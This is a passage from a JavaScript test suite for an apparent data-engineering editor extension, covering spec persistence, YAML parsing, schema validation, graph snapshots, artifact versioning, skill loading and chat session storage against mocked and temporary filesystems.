    const model = { id: 'copilot-4o', family: 'gpt-4o', vendor: 'copilot', version: '1', name: 'Copilot-4o', maxInputTokens: 128000,
      sendRequest: async () => ({ text: textIter(payload) }) };
    const mock = createMock({ models: [model] });
    delete require.cache[require.resolve('../dist/core/agentHub.js')];
    clearAdapterCache();
    const { DataAgentHubHub } = withMock(mock, () => require('../dist/core/agentHub.js'));
    const hub = new DataAgentHubHub(fakeCm({ activeLlmProvider: 'copilot', activeLlmModel: 'x', languageModelProgrammaticConsent: true, defaultProvider: 'snowflake' }));
    const { createIntakeSession } = require('../dist/engine/interview/specOps.js');
    const spec = await withMock(mock, () => hub.synthesizeComprehensiveSpec(createIntakeSession('Load sales', { fields: [] })));
    assert.strictEqual(spec.status, 'draft');
    assert.strictEqual(spec.dataFlows[0].target, 'fact_sales');
    assert.deepStrictEqual(spec.businessRequirements, ['daily mart']);
  });


  await test('SpecManager round-trips comprehensive v2 fields', async () => {
    function specManagerMock() {
      const store = new Map();
      const keyOf = (uri) => (uri && uri.fsPath) ? uri.fsPath : String(uri);
      return {
        Uri: {
          file: (p) => ({ fsPath: p }),
          joinPath: (...parts) => ({ fsPath: parts.map((p) => (p && p.fsPath) ? p.fsPath : String(p)).join('/') })
        },
        workspace: {
          fs: {
            createDirectory: async () => {},
            readFile: async (uri) => { const v = store.get(keyOf(uri)); if (!v) throw new Error('ENOENT'); return Buffer.from(v, 'utf8'); },
            writeFile: async (uri, buf) => { store.set(keyOf(uri), buf.toString('utf8')); },
            rename: async (a, b) => { store.set(keyOf(b), store.get(keyOf(a))); store.delete(keyOf(a)); }
          }
        }
      };
    }
    const mock = specManagerMock();
    delete require.cache[require.resolve('../dist/context/SpecManager.js')];
    const { SpecManager } = withMock(mock, () => require('../dist/context/SpecManager.js'));
    const ws = { fsPath: '/ws' };
    const mgr = new SpecManager(ws, () => {});
    await withMock(mock, () => mgr.initialize());
    const spec = {
      id: 'bps-1', version: 1, status: 'draft', problemStatement: 'p', objectives: ['o'], successCriteria: [],
      scope: { in: ['a'], out: [] }, constraints: [], assumptions: [], domain: 'd', stakeholders: ['s'], keyEntities: ['e'],
      businessRequirements: ['br'],
      dataFlows: [{ id: 'f1', source: 'src', target: 'tgt', description: 'd', frequency: 'daily' }],
      transformations: ['x'], dependencies: ['y'], acceptanceCriteria: ['z'], implementationConsiderations: ['w'],
      sourceCatalog: [{ name: 'n', type: 'database' }],
      provenance: [{ field: 'dataFlows', source: 'question', questionId: 'q1' }],
      createdAt: 'c', updatedAt: 'u'
    };
    await withMock(mock, () => mgr.saveSpec(spec));
    const mgr2 = new SpecManager(ws, () => {});
    await withMock(mock, () => mgr2.initialize());
    const loaded = mgr2.getSpec();
    assert.strictEqual(loaded.businessRequirements[0], 'br');
    assert.strictEqual(loaded.dataFlows[0].target, 'tgt');
    assert.strictEqual(loaded.sourceCatalog[0].type, 'database');
    assert.strictEqual(loaded.provenance[0].questionId, 'q1');
    assert.deepStrictEqual(loaded.implementationConsiderations, ['w']);
  });


  // ── Phase 3 primitives: YAML, AJV validation, atomic graph persistence ──
  await test('parseYaml/stringifyYaml round-trips nested structures', () => {
    const { parseYaml, stringifyYaml } = require('../dist/engine/context/Yaml.js');
    const input = { business_terms: [{ term: 'revenue', description: 'net sales' }], flags: { enabled: true, n: 3 } };
    const parsed = parseYaml(stringifyYaml(input));
    assert.deepStrictEqual(parsed, input);
    assert.deepStrictEqual(parseYaml('a: 1\nb:\n  - x\n  - y'), { a: 1, b: ['x', 'y'] });
  });

  await test('ContextValidator validates the envelope schema', () => {
    const { ContextValidator } = require('../dist/engine/context/ContextValidator.js');
    const schema = require('../docs/schemas/context-envelope.schema.json');
    const validator = new ContextValidator(schema);
    const valid = validator.validateEnvelope({
      id: 'term:revenue', kind: 'business_term', layer: 'definition', label: 'Revenue',
      origin: { source: 'user', sourceRef: 'me' }, version: 1, content: { formula: 'net' }
    });
    assert.strictEqual(valid.valid, true, valid.errors.join('; '));

    const invalid = validator.validateEnvelope({ id: 'nope', kind: 'unknown_kind', layer: 'nope', label: 'x', origin: { source: 'user', sourceRef: 'me' }, version: 1 });
    assert.strictEqual(invalid.valid, false);
    assert.ok(invalid.errors.length > 0);

    const missing = validator.validateEnvelope({ kind: 'business_term', label: 'x' });
    assert.strictEqual(missing.valid, false);
  });

  await test('GraphPersistence writes and reads snapshots atomically', () => {
    const os = require('node:os');
    const path = require('node:path');
    const fs = require('node:fs');
    const { writeGraphSnapshot, readGraphSnapshot } = require('../dist/engine/context/graphPersistence.js');
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'autode-graph-'));
    const file = path.join(dir, 'derived', 'graph.json');
    const snapshot = { nodes: [{ id: 'term:x', type: 'business_term', label: 'x' }], edges: [], compiledAt: '2026-01-01T00:00:00.000Z' };
    writeGraphSnapshot(file, snapshot);
    const loaded = readGraphSnapshot(file);
    assert.strictEqual(loaded.nodes.length, 1);
    assert.strictEqual(loaded.nodes[0].id, 'term:x');
    assert.strictEqual(loaded.compiledAt, '2026-01-01T00:00:00.000Z');
    assert.strictEqual(fs.readdirSync(path.join(dir, 'derived')).length, 1, 'no temp files left behind');
    fs.rmSync(dir, { recursive: true, force: true });
  });


  

  // ── Phase 3 (part 2): real YAML parser wired into the context layer ──
  await test('SpecManager reads legacy flat-format (scopeIn/scopeOut) files', async () => {
    function specManagerMock() {
      const store = new Map();
      const keyOf = (uri) => (uri && uri.fsPath) ? uri.fsPath : String(uri);
      const legacy = [
        '# AutoDE Business Problem Specification',
        'id: bps-legacy',
        'version: 2',
        'status: approved',
        'problemStatement: Legacy flat-format spec.',
        'objectives:',
        '  - obj1',
        'successCriteria:',
        '  - sc1',
        'scopeIn:',
        '  - in1',
        'scopeOut:',
        '  - out1',
        'constraints:',
        '  - c1',
        'assumptions:',
        '  - a1',
        'domain: data engineering',
        'stakeholders:',
        '  - eng',
        'keyEntities:',
        '  - sales',
        'createdAt: 2026-01-01T00:00:00.000Z',
        'updatedAt: 2026-01-02T00:00:00.000Z',
        'approvedAt: 2026-01-02T00:00:00.000Z',
        'approvedBy: user'
      ].join('\n') + '\n';
      store.set('/ws/.autode/problems/p1/spec/business-problem.yaml', legacy);
      return {
        Uri: {
          file: (p) => ({ fsPath: p }),
          joinPath: (...parts) => ({ fsPath: parts.map((p) => (p && p.fsPath) ? p.fsPath : String(p)).join('/') })
        },
        workspace: {
          fs: {
            createDirectory: async () => {},
            readFile: async (uri) => { const v = store.get(keyOf(uri)); if (!v) throw new Error('ENOENT'); return Buffer.from(v, 'utf8'); },
            writeFile: async (uri, buf) => { store.set(keyOf(uri), buf.toString('utf8')); },
            rename: async (a, b) => { store.set(keyOf(b), store.get(keyOf(a))); store.delete(keyOf(a)); },
            stat: async () => { throw new Error('ENOENT'); }
          }
        }
      };
    }
    const mock = specManagerMock();
    delete require.cache[require.resolve('../dist/context/SpecManager.js')];
    const { SpecManager } = withMock(mock, () => require('../dist/context/SpecManager.js'));
    const mgr = new SpecManager({ fsPath: '/ws/.autode/problems/p1' }, () => {});
    await withMock(mock, () => mgr.initialize());
    const spec = mgr.getSpec();
    assert.strictEqual(spec.id, 'bps-legacy');
    assert.strictEqual(spec.version, 2);
    assert.strictEqual(spec.status, 'approved');
    assert.deepStrictEqual(spec.scope.in, ['in1']);
    assert.deepStrictEqual(spec.scope.out, ['out1']);
    assert.deepStrictEqual(spec.constraints, ['c1']);
    assert.strictEqual(spec.domain, 'data engineering');
  });

  await test('SpecManager reads legacy comprehensive: JSON block', async () => {
    function specManagerMock() {
      const store = new Map();
      const keyOf = (uri) => (uri && uri.fsPath) ? uri.fsPath : String(uri);
      const v2 = JSON.stringify({ businessRequirements: ['br1'], transformations: ['x'] });
      const legacy = [
        '# AutoDE Business Problem Specification',
        'id: bps-v2legacy',
        'version: 1',
        'status: draft',
        'problemStatement: Has a comprehensive block.',
        'objectives:',
        '  - o1',
        'successCriteria:',
        '  - s1',
        'scopeIn:',
        '  - in1',
        'scopeOut:',
        '  - out1',
        'constraints:',
        '  - c1',
        'assumptions:',
        '  - a1',
        `comprehensive: ${v2}`,
        'createdAt: 2026-01-01T00:00:00.000Z',
        'updatedAt: 2026-01-01T00:00:00.000Z'
      ].join('\n') + '\n';
      store.set('/ws/.autode/problems/p1/spec/business-problem.yaml', legacy);
      return {
        Uri: {
          file: (p) => ({ fsPath: p }),
          joinPath: (...parts) => ({ fsPath: parts.map((p) => (p && p.fsPath) ? p.fsPath : String(p)).join('/') })
        },
        workspace: {
          fs: {
            createDirectory: async () => {},
            readFile: async (uri) => { const v = store.get(keyOf(uri)); if (!v) throw new Error('ENOENT'); return Buffer.from(v, 'utf8'); },
            writeFile: async (uri, buf) => { store.set(keyOf(uri), buf.toString('utf8')); },
            rename: async (a, b) => { store.set(keyOf(b), store.get(keyOf(a))); store.delete(keyOf(a)); },
            stat: async () => { throw new Error('ENOENT'); }
          }
        }
      };
    }
    const mock = specManagerMock();
    delete require.cache[require.resolve('../dist/context/SpecManager.js')];
    const { SpecManager } = withMock(mock, () => require('../dist/context/SpecManager.js'));
    const mgr = new SpecManager({ fsPath: '/ws/.autode/problems/p1' }, () => {});
    await withMock(mock, () => mgr.initialize());
    const spec = mgr.getSpec();
    assert.deepStrictEqual(spec.businessRequirements, ['br1']);
    assert.deepStrictEqual(spec.transformations, ['x']);
  });

  await test('SpecManager writes native YAML (scope nested, no comprehensive JSON)', async () => {
    function specManagerMock() {
      const store = new Map();
      const keyOf = (uri) => (uri && uri.fsPath) ? uri.fsPath : String(uri);
      return {
        Uri: {
          file: (p) => ({ fsPath: p }),
          joinPath: (...parts) => ({ fsPath: parts.map((p) => (p && p.fsPath) ? p.fsPath : String(p)).join('/') })
        },
        workspace: {
          fs: {
            createDirectory: async () => {},
            readFile: async (uri) => { const v = store.get(keyOf(uri)); if (!v) throw new Error('ENOENT'); return Buffer.from(v, 'utf8'); },
            writeFile: async (uri, buf) => { store.set(keyOf(uri), buf.toString('utf8')); },
            rename: async (a, b) => { store.set(keyOf(b), store.get(keyOf(a))); store.delete(keyOf(a)); },
            stat: async () => { throw new Error('ENOENT'); }
          }
        }
      };
    }
    const mock = specManagerMock();
    delete require.cache[require.resolve('../dist/context/SpecManager.js')];
    const { SpecManager } = withMock(mock, () => require('../dist/context/SpecManager.js'));
    const mgr = new SpecManager({ fsPath: '/ws/.autode/problems/p1' }, () => {});
    await withMock(mock, () => mgr.initialize());
    const spec = {
      id: 'bps-native', version: 1, status: 'draft', problemStatement: 'Native YAML spec.',
      objectives: ['o1'], successCriteria: ['s1'], scope: { in: ['in1'], out: ['out1'] },
      constraints: ['c1'], assumptions: ['a1'], domain: 'de', stakeholders: ['eng'], keyEntities: ['sales'],
      businessRequirements: ['br1'], dataFlows: [{ id: 'f1', source: 'src', target: 'tgt', description: 'd', frequency: 'daily' }],
      transformations: ['x'], dependencies: ['y'], acceptanceCriteria: ['z'], implementationConsiderations: ['w'],
      sourceCatalog: [{ name: 'n', type: 'database' }], provenance: [{ field: 'dataFlows', source: 'question', questionId: 'q1' }],
      createdAt: 'c', updatedAt: 'u'
    };
    await withMock(mock, () => mgr.saveSpec(spec));
    let raw = null;
    await mock.workspace.fs.readFile({ fsPath: '/ws/.autode/problems/p1/spec/business-problem.yaml' }).then((b) => { raw = b.toString('utf8'); });
    assert.ok(!raw.includes('comprehensive:'), 'should not emit the JSON comprehensive block');
    assert.ok(raw.includes('scope:'), 'should emit nested scope');
    assert.ok(raw.includes('businessRequirements:'), 'v2 field emitted natively');
    const mgr2 = new SpecManager({ fsPath: '/ws/.autode/problems/p1' }, () => {});
    await withMock(mock, () => mgr2.initialize());
    const loaded = mgr2.getSpec();
    assert.deepStrictEqual(loaded.scope.in, ['in1']);
    assert.deepStrictEqual(loaded.dataFlows[0].target, 'tgt');
    assert.deepStrictEqual(loaded.businessRequirements, ['br1']);
  });

  await test('SourceRegistry round-trips sources through real YAML', async () => {
    function regMock() {
      const store = new Map();
      const keyOf = (uri) => (uri && uri.fsPath) ? uri.fsPath : String(uri);
      return {
        Uri: {
          file: (p) => ({ fsPath: p }),
          joinPath: (...parts) => ({ fsPath: parts.map((p) => (p && p.fsPath) ? p.fsPath : String(p)).join('/') })
        },
        workspace: {
          fs: {
            createDirectory: async () => {},
            readFile: async (uri) => { const v = store.get(keyOf(uri)); if (!v) throw new Error('ENOENT'); return Buffer.from(v, 'utf8'); },
            writeFile: async (uri, buf) => { store.set(keyOf(uri), buf.toString('utf8')); },
            rename: async (a, b) => { store.set(keyOf(b), store.get(keyOf(a))); store.delete(keyOf(a)); },
            stat: async () => { throw new Error('ENOENT'); }
          }
        }
      };
    }
    const mock = regMock();
    delete require.cache[require.resolve('../dist/context/SourceRegistry.js')];
    const { SourceRegistry } = withMock(mock, () => require('../dist/context/SourceRegistry.js'));
    const reg = new SourceRegistry({ fsPath: '/ws' }, () => {});
    await withMock(mock, () => reg.initialize());
    await withMock(mock, () => reg.addSource('docs/reqs.md', 'business_context', 'alice'));
    const sources = reg.getSources();
    assert.strictEqual(sources.length, 1);
    assert.strictEqual(sources[0].path, 'docs/reqs.md');
    assert.strictEqual(sources[0].owner, 'alice');
    const reg2 = new SourceRegistry({ fsPath: '/ws' }, () => {});
    await withMock(mock, () => reg2.initialize());
    const reloaded = reg2.getSources();
    assert.strictEqual(reloaded.length, 1);
    assert.strictEqual(reloaded[0].path, 'docs/reqs.md');
    assert.strictEqual(reloaded[0].owner, 'alice');
  });

  await test('ContextFileManager loads authoritative context + persists compiled graph atomically', async () => {
    const os = require('node:os');
    const path = require('node:path');
    const fs = require('node:fs');
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'autode-cfm-'));
    const ctxDir = path.join(dir, '.autode');
    const authDir = path.join(ctxDir, 'knowledge');
    fs.mkdirSync(authDir, { recursive: true });
    const bizCtx = [
      'business_terms:',
      '  - term: revenue',
      '    description: net sales',
      '    mapped_tables:',
      '      - orders'
    ].join('\n') + '\n';
    fs.writeFileSync(path.join(authDir, 'business-context.yaml'), bizCtx);

    function cfmMock() {
      const store = new Map();
      const keyOf = (uri) => (uri && uri.fsPath) ? uri.fsPath : String(uri);
      return {
        Uri: {
          file: (p) => ({ fsPath: p }),
          joinPath: (...parts) => ({ fsPath: parts.map((p) => (p && p.fsPath) ? p.fsPath : String(p)).join('/') })
        },
        workspace: {
          fs: {
            createDirectory: async (uri) => { fs.mkdirSync(uri.fsPath, { recursive: true }); },
            readFile: async (uri) => { const v = store.get(keyOf(uri)); if (v) return Buffer.from(v, 'utf8'); if (fs.existsSync(uri.fsPath)) return fs.readFileSync(uri.fsPath); throw new Error('ENOENT'); },
            writeFile: async (uri, buf) => { store.set(keyOf(uri), buf.toString('utf8')); fs.writeFileSync(uri.fsPath, buf); },
            rename: async (a, b) => { const v = store.get(keyOf(a)) ?? (fs.existsSync(a.fsPath) ? fs.readFileSync(a.fsPath, 'utf8') : null); if (v != null) { store.set(keyOf(b), v); fs.writeFileSync(b.fsPath, v); } store.delete(keyOf(a)); try { fs.unlinkSync(a.fsPath); } catch {} },
            stat: async () => { throw new Error('ENOENT'); }
          },
          createFileSystemWatcher: () => ({ onDidChange: () => {}, onDidCreate: () => {}, onDidDelete: () => {}, dispose: () => {} })
        },
        RelativePattern: class { constructor(_base, _pattern) {} }
      };
    }
    const mock = cfmMock();
    delete require.cache[require.resolve('../dist/context/ContextFileManager.js')];
    delete require.cache[require.resolve('../dist/context/GraphManager.js')];
    const { ContextFileManager } = withMock(mock, () => require('../dist/context/ContextFileManager.js'));
    const { GraphManager } = withMock(mock, () => require('../dist/context/GraphManager.js'));
    const graph = new GraphManager();
    const cfm = new ContextFileManager({ fsPath: dir }, graph, () => {});
    await withMock(mock, () => cfm.initialize());
    const terms = graph.getNodesByType('business_term');
    assert.strictEqual(terms.length, 1, 'loaded business_term from authoritative context/');
    assert.strictEqual(terms[0].label, 'revenue');
    const graphPath = path.join(ctxDir, 'local', 'derived', 'graph.json');
    assert.ok(fs.existsSync(graphPath), 'derived/graph.json written atomically');
    const persisted = JSON.parse(fs.readFileSync(graphPath, 'utf8'));
    assert.strictEqual(persisted.nodes.length, 1);
    assert.strictEqual(persisted.nodes[0].label, 'revenue');
    fs.rmSync(dir, { recursive: true, force: true });
  });

  await test('ContextFileManager picks up a freshly-written schema-graph.json even after derived/graph.json already exists (real bug: a Source Assessment run after first activation was silently never read again)', async () => {
    const os = require('node:os');
    const path = require('node:path');
    const fs = require('node:fs');
    const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'autode-cfm-schema-'));
    const ctxDir = path.join(dir, '.autode');
    fs.mkdirSync(path.join(ctxDir, 'local'), { recursive: true });

    function cfmMock() {
      return {
        Uri: { file: (p) => ({ fsPath: p }), joinPath: (...parts) => ({ fsPath: parts.map((p) => (p && p.fsPath) ? p.fsPath : String(p)).join('/') }) },
        workspace: {
          fs: {
            createDirectory: async (uri) => { fs.mkdirSync(uri.fsPath, { recursive: true }); },
            readFile: async (uri) => { if (fs.existsSync(uri.fsPath)) return fs.readFileSync(uri.fsPath); throw new Error('ENOENT'); },
            writeFile: async (uri, buf) => { fs.writeFileSync(uri.fsPath, buf); },
            rename: async (a, b) => { fs.renameSync(a.fsPath, b.fsPath); },
            stat: async () => { throw new Error('ENOENT'); }
          },
          createFileSystemWatcher: () => ({ onDidChange: () => {}, onDidCreate: () => {}, onDidDelete: () => {}, dispose: () => {} })
        },
        RelativePattern: class { constructor(_base, _pattern) {} }
      };
    }
    const mock = cfmMock();
    delete require.cache[require.resolve('../dist/context/ContextFileManager.js')];
    delete require.cache[require.resolve('../dist/context/GraphManager.js')];
    const { ContextFileManager } = withMock(mock, () => require('../dist/context/ContextFileManager.js'));
    const { GraphManager } = withMock(mock, () => require('../dist/context/GraphManager.js'));

    // Step 1: "first activation" on an empty workspace — this alone creates
    // derived/graph.json (with zero nodes), exactly as it does in production.
    const graph1 = new GraphManager();
    const cfm1 = new ContextFileManager({ fsPath: dir }, graph1, () => {});
    await withMock(mock, () => cfm1.initialize());
    const graphPath = path.join(ctxDir, 'local', 'derived', 'graph.json');
    assert.ok(fs.existsSync(graphPath), 'derived/graph.json exists after the very first activation, even with nothing extracted yet');
    assert.strictEqual(graph1.getNodesByType('table').length, 0);

    // Step 2: "Source Assessment" writes schema-graph.json with real tables —
    // give it a guaranteed-later mtime (real filesystem timestamp resolution can
    // otherwise be too coarse to distinguish two writes microseconds apart).
    const schemaGraphPath = path.join(ctxDir, 'local', 'schema-graph.json');
    fs.writeFileSync(schemaGraphPath, JSON.stringify({
      nodes: [{ id: 't1', type: 'table', label: 'orders', fqn: 'db.public.orders', metadata: {}, version: 1 }],
      edges: []
    }));
    const future = new Date(Date.now() + 60000);
    fs.utimesSync(schemaGraphPath, future, future);

    // Step 3: a fresh reindex (simulating the file-watcher-triggered reload, or a
    // reload of the extension) must now pick up the newer schema-graph.json.
    const graph2 = new GraphManager();
    const cfm2 = new ContextFileManager({ fsPath: dir }, graph2, () => {});
    await withMock(mock, () => cfm2.initialize());
    const tables = graph2.getNodesByType('table');
    assert.strictEqual(tables.length, 1, 'the freshly-extracted table is now loaded, not shadowed by the older compiled cache');
    assert.strictEqual(tables[0].label, 'orders');

    fs.rmSync(dir, { recursive: true, force: true });
  });

  await test('ArtifactWriter writes under a <specId>.v<version> folder; scanArtifactStaleness classifies current/stale/untagged', async () => {
    const os = require('node:os');
    const path = require('node:path');
    const fs = require('node:fs');
    const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'autode-artifacts-'));
    const problemDir = path.join(tmpRoot, '.autode', 'problems', 'p1');
    const workspaceRoot = { fsPath: problemDir, toString: () => problemDir };
    const mock = createMock();
    // createMock()'s default fs.* are no-ops (fine for adapter tests); this test
    // needs real writes so scanArtifactStaleness can walk an actual tree.
    mock.workspace.fs.createDirectory = async (uri) => { fs.mkdirSync(uri.fsPath, { recursive: true }); };
    mock.workspace.fs.writeFile = async (uri, buf) => { fs.writeFileSync(uri.fsPath, buf); };
    mock.workspace.fs.rename = async (a, b) => { fs.renameSync(a.fsPath, b.fsPath); };

    clearAdapterCache();
    for (const p of ['../dist/context/ArtifactWriter.js', '../dist/context/ArtifactStalenessScanner.js']) {
      try { delete require.cache[require.resolve(p)]; } catch { /* not loaded */ }
    }
    const { ArtifactWriter } = withMock(mock, () => require('../dist/context/ArtifactWriter.js'));
    const { scanArtifactStaleness } = withMock(mock, () => require('../dist/context/ArtifactStalenessScanner.js'));

    const writer = new ArtifactWriter(workspaceRoot, () => {});
    const makeArtifact = (id, specId, specVersion) => ({
      id, type: 'ddl', title: id, description: '', content: 'select 1', language: 'sql',
      generatedBy: 'dataModelerAgent', generatedAt: 't', approved: false, phase: 'build', specId, specVersion
    });

    await withMock(mock, async () => {
      await writer.write(makeArtifact('a1', 'bps-1', 1));   // superseded revision
      await writer.write(makeArtifact('a2', 'bps-1', 2));   // current revision
      await writer.write({ ...makeArtifact('legacy', undefined, undefined) }); // pre-Phase-B / no spec
    });

    // v0.36.0: deliverables live in the visible output folder, one subfolder per problem.
    assert.ok(fs.existsSync(path.join(tmpRoot, 'autode-output', 'p1', '03-build', 'bps-1.v1', 'a1.sql')), 'v1 artifact under its spec-tagged folder');
    assert.ok(fs.existsSync(path.join(tmpRoot, 'autode-output', 'p1', '03-build', 'bps-1.v2', 'a2.sql')), 'v2 artifact under its spec-tagged folder');
    assert.ok(fs.existsSync(path.join(tmpRoot, 'autode-output', 'p1', '03-build', 'legacy.sql')), 'unstamped artifact has no version folder');
    assert.ok(!fs.existsSync(path.join(problemDir, 'artifacts')), 'nothing is written inside .autode/');

    const report = await withMock(mock, () => scanArtifactStaleness(workspaceRoot, { id: 'bps-1', version: 2 }));
    const stale = report.groups.find((g) => g.specVersion === 1);
    const current = report.groups.find((g) => g.specVersion === 2);
    assert.ok(stale, 'v1 group detected');
    assert.strictEqual(stale.status, 'stale');
    assert.ok(current, 'v2 group detected');
    assert.strictEqual(current.status, 'current');
    assert.strictEqual(report.untaggedFileCount, 1, 'the unstamped artifact counts as untagged, not stale');

    fs.rmSync(tmpRoot, { recursive: true, force: true });
  });

  await test('parseSkillMarkdown() splits YAML frontmatter from the instruction body, leniently', () => {
    const mock = createMock();
    const { parseSkillMarkdown } = withMock(mock, () => require('../dist/engine/skills/toolSkills.js'));
    const withFrontmatter = [
      '---',
      'name: PDF Filler',
      'description: Fills out PDF forms',
      'allowed-tools: [Read, Write, Bash]',
      '---',
      '',
      '# Instructions',
      'Do the thing.'
    ].join('\n');
    const parsed = parseSkillMarkdown(withFrontmatter);
    assert.strictEqual(parsed.name, 'PDF Filler');
    assert.strictEqual(parsed.description, 'Fills out PDF forms');
    assert.deepStrictEqual(parsed.allowedTools, ['Read', 'Write', 'Bash']);
    assert.ok(parsed.body.startsWith('# Instructions'));

    const noFrontmatter = 'Just plain instructions, no frontmatter.';
    const parsed2 = parseSkillMarkdown(noFrontmatter);
    assert.strictEqual(parsed2.name, undefined);
    assert.strictEqual(parsed2.body, noFrontmatter);
  });

  await test('loadToolSkillsFromDirectory() loads imported skills and lists bundled resource files', () => {
    const os = require('node:os');
    const path = require('node:path');
    const fs = require('node:fs');
    const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'autode-skills-'));
    const skillDir = path.join(tmpRoot, 'pdf-filler');
    fs.mkdirSync(path.join(skillDir, 'scripts'), { recursive: true });
    fs.writeFileSync(path.join(skillDir, 'SKILL.md'), [
      '---', 'name: PDF Filler', 'description: Fills PDF forms', '---', '', 'Use fill.py to fill the form.'
    ].join('\n'));
    fs.writeFileSync(path.join(skillDir, 'scripts', 'fill.py'), 'print("fill")');
    // A directory without SKILL.md should be skipped rather than failing the whole load.
    fs.mkdirSync(path.join(tmpRoot, 'not-a-skill'), { recursive: true });

    const mock = createMock();
    const { loadToolSkillsFromDirectory } = withMock(mock, () => require('../dist/engine/skills/toolSkills.js'));
    const skills = loadToolSkillsFromDirectory(tmpRoot);
    assert.strictEqual(skills.length, 1);
    assert.strictEqual(skills[0].id, 'pdf-filler');
    assert.strictEqual(skills[0].name, 'PDF Filler');
    assert.ok(skills[0].instructions.includes('fill.py'));
    assert.deepStrictEqual(skills[0].resourceFiles.sort(), ['scripts/fill.py']);

    fs.rmSync(tmpRoot, { recursive: true, force: true });
  });

  await test('loadToolSkillsFromDirectory() returns an empty list when the directory does not exist', () => {
    const mock = createMock();
    const { loadToolSkillsFromDirectory } = withMock(mock, () => require('../dist/engine/skills/toolSkills.js'));
    assert.deepStrictEqual(loadToolSkillsFromDirectory('/no/such/directory/at/all'), []);
  });

  function realFsMock() {
    const fs = require('node:fs');
    const mock = createMock();
    mock.workspace.fs.createDirectory = async (uri) => { fs.mkdirSync(uri.fsPath, { recursive: true }); };
    mock.workspace.fs.writeFile = async (uri, buf) => { fs.writeFileSync(uri.fsPath, buf); };
    mock.workspace.fs.readFile = async (uri) => { try { return fs.readFileSync(uri.fsPath); } catch { throw new Error('ENOENT'); } };
    mock.workspace.fs.rename = async (a, b) => { fs.renameSync(a.fsPath, b.fsPath); };
    mock.workspace.fs.delete = async (uri) => { fs.unlinkSync(uri.fsPath); };
    return mock;
  }

  await test('ChatSessionManager creates, appends, lists, archives, and discards sessions', async () => {
    const os = require('node:os');
    const path = require('node:path');
    const fs = require('node:fs');
    const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'autode-chats-'));
    const workspaceRoot = { fsPath: tmpRoot, toString: () => tmpRoot };
    const mock = realFsMock();

    clearAdapterCache();
    try { delete require.cache[require.resolve('../dist/context/ChatSessionManager.js')]; } catch { /* not loaded */ }
    const { ChatSessionManager } = withMock(mock, () => require('../dist/context/ChatSessionManager.js'));

    const logs = [];
    const manager = withMock(mock, () => new ChatSessionManager(workspaceRoot, (m) => logs.push(m)));

    await withMock(mock, () => manager.initialize());
    assert.ok(fs.existsSync(path.join(tmpRoot, '.autode', 'local', 'chats')), 'chats directory created');

    const session = await withMock(mock, () => manager.createSession({ specId: 'bps-1', specVersion: 2, llmProvider: 'claude' }));
    assert.strictEqual(session.status, 'active');
    assert.strictEqual(session.specId, 'bps-1');

    const active = await withMock(mock, () => manager.getActiveSession());
    assert.strictEqual(active.id, session.id, 'the freshly created session is the active one');

    await withMock(mock, () => manager.appendMessage(session.id, { role: 'user', content: 'Hello there, this is my question', at: new Date().toISOString() }));
    await withMock(mock, () => manager.appendMessage(session.id, { role: 'ai', content: 'Sure, here is an answer', at: new Date().toISOString() }));

    const transcript = await withMock(mock, () => manager.loadTranscript(session.id));
    assert.strictEqual(transcript.length, 2);
    assert.strictEqual(transcript[0].role, 'user');
    assert.strictEqual(transcript[1].content, 'Sure, here is an answer');

    const metaAfterAppend = (await withMock(mock, () => manager.listSessions()))[0];
    assert.strictEqual(metaAfterAppend.title, 'Hello there, this is my question', 'title backfilled from the first user message');

    await withMock(mock, () => manager.archiveSession(session.id));
    const afterArchive = await withMock(mock, () => manager.getActiveSession());
    assert.strictEqual(afterArchive, undefined, 'no active session once archived');
    const sessions = await withMock(mock, () => manager.listSessions());
    assert.strictEqual(sessions.length, 1);
    assert.strictEqual(sessions[0].status, 'archived');

    await withMock(mock, () => manager.discardSession(session.id));
    assert.ok(!fs.existsSync(path.join(tmpRoot, '.autode', 'local', 'chats', `${session.id}.meta.json`)), 'meta file removed');
    assert.ok(!fs.existsSync(path.join(tmpRoot, '.autode', 'local', 'chats', `${session.id}.jsonl`)), 'transcript file removed');
    const sessionsAfterDiscard = await withMock(mock, () => manager.listSessions());
    assert.strictEqual(sessionsAfterDiscard.length, 0);

    fs.rmSync(tmpRoot, { recursive: true, force: true });
  });

  await test('ChatSessionManager: an archived session can be resumed by setting its status back to active (the primitive the v0.13.0 chat-resume feature relies on)', async () => {
    const os = require('node:os');
    const path = require('node:path');
    const fs = require('node:fs');
    const tmpRoot = fs.mkdtempSync(path.join(os.tmpdir(), 'autode-chats-resume-'));
    const workspaceRoot = { fsPath: tmpRoot, toString: () => tmpRoot };
    const mock = realFsMock();

    clearAdapterCache();
    try { delete require.cache[require.resolve('../dist/context/ChatSessionManager.js')]; } catch { /* not loaded */ }
    const { ChatSessionManager } = withMock(mock, () => require('../dist/context/ChatSessionManager.js'));
    const manager = withMock(mock, () => new ChatSessionManager(workspaceRoot, () => {}));
    await withMock(mock, () => manager.initialize());

    // Simulate the startup fold: an old session with real content gets archived,
    // a fresh one takes its place as active.
    const old = await withMock(mock, () => manager.createSession({ llmProvider: 'claude' }));
    await withMock(mock, () => manager.appendMessage(old.id, { role: 'user', content: 'What did we decide about the pipeline?', at: new Date().toISOString() }));
    await withMock(mock, () => manager.archiveSession(old.id));
    const fresh = await withMock(mock, () => manager.createSession({ llmProvider: 'claude' }));
    assert.strictEqual((await withMock(mock, () => manager.getActiveSession())).id, fresh.id);

    // Resume: fold the fresh (empty) one, reactivate the old one.
    await withMock(mock, () => manager.archiveSession(fresh.id));
    await withMock(mock, () => manager.updateMeta(old.id, { status: 'active' }));
    const reactivated = await withMock(mock, () => manager.getActiveSession());
    assert.strictEqual(reactivated.id, old.id, 'the folded session is active again');
    const transcript = await withMock(mock, () => manager.loadTranscript(old.id));
    assert.strictEqual(transcript.length, 1, 'its transcript survived the fold/resume round-trip');
    assert.strictEqual(transcript[0].content, 'What did we decide about the pipeline?');

    const sessions = await withMock(mock, () => manager.listSessions());
    assert.strictEqual(sessions.filter((s) => s.status === 'active').length, 1, 'exactly one session is active at a time');

    fs.rmSync(tmpRoot, { recursive: true, force: true });
  });

  // ── Generate Plan hardening + expectation-driven capabilities ──

  await test('classifyImplementationType() detects brownfield/greenfield/mixed evidence', () => {
    const { classifyImplementationType } = require('../dist/core/implementationType.js');
